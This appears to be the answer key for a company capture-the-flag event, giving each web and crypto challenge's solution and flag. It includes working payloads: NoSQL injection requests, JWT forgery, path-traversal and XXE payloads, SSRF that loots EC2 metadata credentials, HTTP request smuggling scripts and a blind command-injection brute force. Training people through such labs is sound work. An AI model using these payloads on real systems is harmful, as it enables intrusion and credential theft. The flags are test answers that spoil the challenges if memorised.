# Solutions

## Starter

- look in the html source code (companyctf{f1rst_pl4c3_t0_l00k_a7_1n_4_c7f})
- check /robots.txt to find /the/hid/den/path/to/a/new/flag (companyctf{r0b0ts_4r3_w4y_b3773r_7h4n_p30pl3})

## MD5

- solution: flag.js (companyctf{md5_15_n0t_v3ry_53cur3_4nyw4y})

## JWT

- change alg to "none" and secretid to "null"
- create payload using flag.py (companyctf{i_l0v3_c00k1e5_4nd_j50nw3b70ken})

## JWT 3

- change alg to "HS256" and provide the public key as a string
- solution: flag.js (companyctf{JW7_c4n_b3_h4ck3d_1n_s0_m4ny_w4y5})

## Files

- bypass ../ filter using ..././
- check 1 folder above to get /flag.txt (companyctf{pl4y1ng_w17h_f1l35_15_d4ng3rou5})

## No sequel

- NoSQL injection with $gt or $ne (companyctf{n05ql_d0e5_n07_m34n_n0_1nj3ct10n})

```
curl -H "Content-type: application/json" -d '{"username": {"$gt":""}, "password": {"$gt": ""}}' https://nosql.yourdomain.com/login
```

- Bling NoSQL injection with $regex to get the real password (companyctf{th1s_1s_called_bl1nd_5ql_1nj3ct10n})

## Fun

- Key: BELLASO (Last name of the REAL inventor of this famous cypher)
- flag: companyctf{th1s_guy_1nv3nt3d_s0meth1ng_aw3s0me}

## Fun 2

- transform to binary, then to hex, then decode to string
- Binary: 110000101111000011000010110001101110100011001100111101101110011001101110011010001110010001101110011000101101110011001110101111101100011011100100111100101110000011101000011000001011111001100010011000000110001010111110111011100110001001101110110100001011111011011010111010101101100001101110011000101110000011011000011001101011111011100110111010000110011011100000111001101111101
- Hex: 0x6178616374667b7337347237316e675f6372797074305f3130315f773137685f6d756c3731706c335f73743370737d
- flag: companyctf{s74r71ng_crypt0_101_w17h_mul71pl3_st3ps}
```python
b = int(binary, 2)
h = hex(b)
bytes.fromhex(h[2:]).decode()
```

## Fun 3

- You need to specify:
  - a different user-agent
  - a specific method
  - a specific content-type
  - some data
  - x-forwarded-for header
- final request: curl -A "CompanyBrowser" -XPOST -H "Content-Type: application/json" -H "X-Forwarded-For: 127.0.0.1" -d '{"amount": 1000000, "currency": "dollars"}' http://localhost:8080/
- flag: companyctf{f0ll0w_7h3_gu1d3_4nd_kn0w_y0ur_r3que57}

## RSA

- classic RSA encryption challenge
```python
p = 62004237518891373354112961422235264296687007938732994465343345946285469463571
q = 63431804875549228523832313909380901212822869160400031133964616962306316224309
phi = (p-1)*(q-1)
d = inverse(e, phi)
m = pow(c,d,n)
hex(m)
```
- flag: companyctf{rs4_1s_n0t_th4t_c0mpl1c4t3d_1_gu355}

## UXUI

- go through the website and find the flag at the end
- flag: companyctf{th4t_w4s_th3_w0r5t_UI_p0ss1bl3_th4nk5}

## So much fun in the bucket

- S3 policy is not safe =/ http://somuchfuninthebucket.s3-ap-northeast-1.amazonaws.com/
- go to http://somuchfuninthebucket.s3.amazonaws.com/ to see the file listing
- flag: companyctf{s3_p0l1c13s_4r3_s0_much_fun}

## SQL1

- simple SQL injection
- flag.py
- flag: companyctf{th4t_w45_s0m3_v2ry_b4s1c_stuff}

## SQL2

- simple Blind sql attack
- flag.py
- flag: companyctf{g1v3_m3_b4ck_my_3y35_1_m_bl1nd}

## SQL3

- Blind sql timing attack
- flag.py
- flag: companyctf{t1m1ng_4tt4ck_4r3_fun_as_h3ll}

## XXE

- XML External Entity exploit
- "<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY test SYSTEM 'http://localhost/generate.php'>]><input><firstName>&test;</firstName><lastName>bich</lastName></input>"
- flag: companyctf{th4t_w45_50m3_4w350m3_j0b_th4t_y0u_d1d_th3r3}

## SSRF

- SSRF attack via php webhook 
- Catch one of many possible flags:
  * Simply add file:///etc/flag.txt in the WebHook Form. If the docker container is running on EC2 the metadata service will also be available and ready for being looted :)
  * Loot the Metadata Service if it runs on EC2 => search for http://169.254.169.254/latest/meta-data/iam/security-credentals/{Stuff that lays around there} => with those credentials access to the AWS account is possible and hidden flags f.e. on S3 can be captured
- flag: companyctf{w3lcom3_t0_th3_jungl3}


## HTTP_REQUEST_SMUGGLING_nginx

- HTTP request smuggling 
- Exploit it by running the following script in your bash 
  ```bash
  printf 'GET /a HTTP/1.1\r\n'\
  'Host: localhost\r\n'\
  'Content-Length: 56\r\n'\
  '\r\n'\
  'GET /_hidden/index.html HTTP/1.1\r\n'\
  'Host: notlocalhost\r\n'\
  '\r\n'\
  |nc 127.0.0.1 9015
  ```
  
- flag: companyctf{publ1c_s3rv1c3_15_mY_m0770-@l_C@p0n3}

## HTTP_REQUEST_SMUGGLING_websocket

- More difficult HTTP request smuggling to access a page in a hidden network
- Exploit it (with Python2...pain or gain)
  ```python
  import socket 

  req1 = """GET /socket.io/?EIO=3&transport=websocket HTTP/1.1
  Host: localhost:9020
  Sec-WebSocket-Version: 13
  Upgrade: websocket
  Connection: Upgrade

  """.replace('\n', '\r\n')


  req2 = """GET /flag HTTP/1.1
  Host: flask.net:5000

  """.replace('\n', '\r\n')

  def main(netloc):
      host, port = netloc.split(':')

      sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      sock.connect((host, int(port)))

      sock.sendall(req1)
      data = sock.recv(4096)
      print(data)

      sock.sendall(req2)
      data = sock.recv(4096)
      data = data.decode(errors = 'ignore')

      print(data)

      sock.shutdown(socket.SHUT_RDWR)
      sock.close()

  if __name__ == "__main__":
      main('localhost:9020')
  ```
- flag: companyctf{In_50VI37_rUS5Ia_vODK@_DRiNKs_YOu}

## Status

- exit status code only as output
- use command to do bash blind bruteforce `cat flag.txt | cut -c -2 | grep a`
- cut -c = count
- cut -c -{count} = up to that index
- flag: companyctf{3x1t_c0d3_4r3_very_p0w3rfull_7h1ng5}
